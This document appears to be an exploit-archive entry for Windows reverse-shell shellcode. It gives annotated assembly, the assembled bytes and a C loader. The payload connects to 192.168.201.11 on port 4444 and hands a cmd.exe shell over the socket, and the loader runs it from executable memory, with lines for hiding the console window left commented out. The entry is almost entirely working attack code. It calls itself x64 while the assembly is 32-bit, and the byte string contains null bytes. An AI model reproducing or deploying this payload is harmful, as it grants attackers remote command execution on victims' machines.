# Title: Windows/x64 - Reverse TCP (192.168.201.11:4444) Shellcode (330 Bytes)
# Date: 09.12.2021
# Author: Xenofon Vassilakopoulos
# Tested on: Windows/x64 - 10.0.19043 N/A Build 19043

/*

MIT License

Copyright (c) 2021 Xenofon Vassilakopoulos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


[BITS 32]

global _start

section .text

_start:

; Locate Kernelbase.dll address
XOR ECX, ECX							;zero out ECX
MOV EAX, FS:[ecx + 0x30]				;EAX = PEB
MOV EAX, [EAX + 0x0c]					;EAX = PEB->Ldr
MOV ESI, [EAX + 0x14]					;ESI = PEB->Ldr.InMemoryOrderModuleList
LODSD									;memory address of the second list entry structure
XCHG EAX, ESI							;EAX = ESI , ESI = EAX
LODSD									;memory address of the third list entry structure
XCHG EAX, ESI							;EAX = ESI , ESI = EAX
LODSD									;memory address of the fourth list entry structure
MOV EBX, [EAX + 0x10]					;EBX = Base address

; Export Table
MOV EDX, DWORD  [EBX + 0x3C]			;EDX = DOS->e_lfanew
ADD EDX, EBX							;EDX = PE Header
MOV EDX, DWORD  [EDX + 0x78]			;EDX = Offset export table
ADD EDX, EBX							;EDX = Export table
MOV ESI, DWORD  [EDX + 0x20]			;ESI = Offset names table
ADD ESI, EBX							;ESI = Names table
XOR ECX, ECX							;EXC = 0

GetFunction :

INC ECX; increment counter
LODSD									;Get name offset
ADD EAX, EBX							;Get function name
CMP dword [EAX], 0x50746547				;"PteG"
JNZ SHORT GetFunction					;jump to GetFunction label if not "GetP"
CMP dword [EAX + 0x4], 0x41636F72		;"rocA"
JNZ SHORT GetFunction					;jump to GetFunction label if not "rocA"
CMP dword [EAX + 0x8], 0x65726464		;"ddre"
JNZ SHORT GetFunction					;jump to GetFunction label if not "ddre"

MOV ESI, DWORD [EDX + 0x24]	    		;ESI = Offset ordinals
ADD ESI, EBX							;ESI = Ordinals table
MOV CX,  WORD [ESI + ECX * 2]			;CX = Number of function
DEC ECX									;Decrement the ordinal
MOV ESI, DWORD [EDX + 0x1C]	    		;ESI = Offset address table
ADD ESI, EBX							;ESI = Address table
MOV EDX, DWORD [ESI + ECX * 4]			;EDX = Pointer(offset)
ADD EDX, EBX							;EDX = GetProcAddress

; Get the Address of LoadLibraryA function
XOR ECX, ECX						 ;ECX = 0
PUSH EBX							 ;Kernel32 base address
PUSH EDX							 ;GetProcAddress
PUSH ECX							 ;0
PUSH 0x41797261						 ;"Ayra"
PUSH 0x7262694C						 ;"rbiL"
PUSH 0x64616F4C						 ;"daoL"
PUSH ESP							 ;"LoadLibrary"
PUSH EBX							 ;Kernel32 base address
MOV  ESI, EBX						 ;save the kernel32 address in esi for later
CALL EDX							 ;GetProcAddress(LoadLibraryA)

ADD ESP, 0xC						 ;pop "LoadLibraryA"
POP EDX								 ;EDX = 0
PUSH EAX							 ;EAX = LoadLibraryA
PUSH EDX							 ;ECX = 0
MOV DX, 0x6C6C						 ;"ll"
PUSH EDX
PUSH 0x642E3233						 ;"d.23"
PUSH 0x5F327377						 ;"_2sw"
PUSH ESP							 ;"ws2_32.dll"
CALL EAX							 ;LoadLibrary("ws2_32.dll")

ADD  ESP, 0x10						 ;Clean stack
MOV  EDX, [ESP + 0x4]				 ;EDX = GetProcAddress
PUSH 0x61617075						 ;"aapu"
SUB  word [ESP + 0x2], 0x6161		 ;"pu" (remove "aa")
PUSH 0x74726174						 ;"trat"
PUSH 0x53415357						 ;"SASW"
PUSH ESP							 ;"WSAStartup"
PUSH EAX							 ;ws2_32.dll address
MOV	 EDI, EAX						 ;save ws2_32.dll to use it later
CALL EDX							 ;GetProcAddress(WSAStartup)

; Call WSAStartUp
XOR  EBX, EBX						 ;zero out ebx register
MOV  BX, 0x0190						 ;EAX = sizeof(struct WSAData)
SUB  ESP, EBX						 ;allocate space for the WSAData structure
PUSH ESP							 ;push a pointer to WSAData structure
PUSH EBX							 ;Push EBX as wVersionRequested
CALL EAX							 ;Call WSAStartUp

;Find the address of WSASocketA
ADD  ESP, 0x10						 ;Align the stack
XOR  EBX, EBX						 ;zero out the EBX register
ADD  BL, 0x4						 ;add 0x4 at the lower register BL
IMUL EBX, 0x64						 ;EBX = 0x190
MOV  EDX, [ESP + EBX]				 ;EDX has the address of GetProcAddress
PUSH 0x61614174						 ;"aaAt"
SUB  word [ESP + 0x2], 0x6161	     ;"At" (remove "aa")
PUSH  0x656b636f					 ;"ekco"
PUSH  0x53415357				 	 ;"SASW"
PUSH ESP							 ;"WSASocketA", GetProcAddress 2nd argument
MOV  EAX, EDI						 ;EAX now holds the ws2_32.dll address
PUSH EAX							 ;push the first argument of GetProcAddress
CALL EDX							 ;call GetProcAddress
PUSH EDI							 ;save the ws2_32.dll address to use it later

;call WSASocketA
XOR ECX, ECX						 ;zero out ECX register
PUSH EDX							 ;null value for dwFlags argument
PUSH EDX							 ;zero value since we dont have an existing socket group
PUSH EDX							 ;null value for lpProtocolInfo
MOV  DL, 0x6						 ;IPPROTO_TCP
PUSH EDX							 ;set the protocol argument
INC  ECX							 ;SOCK_STREAM(TCP)
PUSH ECX							 ;set the type argument
INC  ECX							 ;AF_INET(IPv4)
PUSH ECX							 ;set the ddress family specification argument
CALL EAX							 ;call WSASocketA
XCHG EAX, ECX						 ;save the socket returned from WSASocketA at EAX to ECX in order to use it later

;Find the address of connect
POP  EDI                             ;load previously saved ws2_32.dll address to ECX
ADD  ESP, 0x10                       ;Align stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x63                       ;EBX = 0x18c
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61746365                      ;"atce"
SUB  word [ESP + 0x3], 0x61		     ;"tce" (remove "a")
PUSH 0x6e6e6f63                      ;"nnoc"
PUSH ESP                             ;"connect", second argument of GetProcAddress
PUSH EDI                             ;ws32_2.dll address, first argument of GetProcAddress
XCHG ECX, EBP
CALL EDX                             ;call GetProcAddress

;call connect
PUSH 0x0bc9a8c0                      ;sin_addr set to 192.168.201.11
PUSH word 0x5c11				 	 ;port = 4444
XOR  EBX, EBX                        ;zero out EBX
add  BL, 0x2                         ;TCP protocol
PUSH word BX						 ;push the protocol value on the stack
MOV  EDX, ESP                        ;pointer to sockaddr structure (IP,Port,Protocol)
PUSH byte  16					 	 ;the size of sockaddr - 3rd argument of connect
PUSH EDX                             ;push the sockaddr - 2nd argument of connect
PUSH EBP                             ;socket descriptor = 64 - 1st argument of connect
XCHG EBP, EDI
CALL EAX                             ;execute connect;

;Find the address of CreateProcessA
ADD  ESP, 0x14                       ;Clean stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x62                       ;EBX = 0x194
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61614173                      ;"aaAs"
SUB  dword [ESP + 0x2], 0x6161		 ;"As"
PUSH 0x7365636f                      ;"seco"
PUSH 0x72506574                      ;"rPet"
PUSH 0x61657243                      ;"aerC"
PUSH ESP                             ;"CreateProcessA" - 2nd argument of GetProcAddress
MOV  EBP, ESI                        ;move the kernel32.dll to EBP
PUSH EBP                             ;kernel32.dll address - 1st argument of GetProcAddress
CALL EDX                             ;execute GetProcAddress
PUSH EAX                             ;address of CreateProcessA
LEA EBP, [EAX]                       ;EBP now points to the address of CreateProcessA

;call CreateProcessA
PUSH 0x61646d63                      ;"admc"
SUB  word [ESP + 0x3], 0x61			 ;"dmc" ( remove a)
MOV  ECX, ESP                        ;ecx now points to "cmd" string
XOR  EDX, EDX                        ;zero out EDX
SUB  ESP, 16
MOV  EBX, esp                        ;pointer for ProcessInfo

;STARTUPINFOA struct
PUSH EDI                             ;hStdError  => saved socket
PUSH EDI                             ;hStdOutput => saved socket
PUSH EDI                             ;hStdInput  => saved socket
PUSH EDX                             ;lpReserved2 => NULL
PUSH EDX                             ;cbReserved2 => NULL
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
ROL  EAX, 8                          ;EAX => 0x00000100
PUSH EAX                             ;dwFlags => STARTF_USESTDHANDLES 0x00000100
PUSH EDX                             ;dwFillAttribute => NULL
PUSH EDX                             ;dwYCountChars => NULL
PUSH EDX                             ;dwXCountChars => NULL
PUSH EDX                             ;dwYSize => NULL
PUSH EDX                             ;dwXSize => NULL
PUSH EDX                             ;dwY => NULL
PUSH EDX                             ;dwX => NULL
PUSH EDX                             ;pTitle => NULL
PUSH EDX                             ;pDesktop => NULL
PUSH EDX                             ;pReserved => NULL
XOR  EAX, EAX                        ;zero out EAX
ADD  AL, 44                          ;cb => 0x44 (size of struct)
PUSH EAX                             ;eax points to STARTUPINFOA

;ProcessInfo struct
MOV  EAX, ESP                        ;pStartupInfo
PUSH EBX                             ;pProcessInfo
PUSH EAX                             ;pStartupInfo
PUSH EDX                             ;CurrentDirectory => NULL
PUSH EDX                             ;pEnvironment => NULL
PUSH EDX                             ;CreationFlags => 0
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
PUSH EAX                             ;InheritHandles => TRUE => 1
PUSH EDX                             ;pThreadAttributes => NULL
PUSH EDX                             ;pProcessAttributes => NULL
PUSH ECX                             ;pCommandLine => pointer to "cmd"
PUSH EDX                             ;ApplicationName => NULL
CALL EBP                             ;execute CreateProcessA

*/

#include <windows.h>
#include <iostream>
#include <stdlib.h>

char code[] =
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
"\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
"\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
"\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53"
"\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54"
"\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33"
"\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04"
"\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68"
"\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc"
"\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c"
"\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68"
"\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06"
"\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b"
"\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63"
"\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c"
"\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83"
"\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61"
"\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72"
"\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64"
"\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57"
"\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
"\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
"\x52\x52\x51\x52\xff\xd5";

int main(int argc, char** argv)
{
	//HWND hWnd = GetConsoleWindow();
	//ShowWindow(hWnd, SW_HIDE);
	printf("Shellcode Length:  %d\n", strlen(code));
	void* exec = VirtualAlloc(0, strlen(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	return 0;
}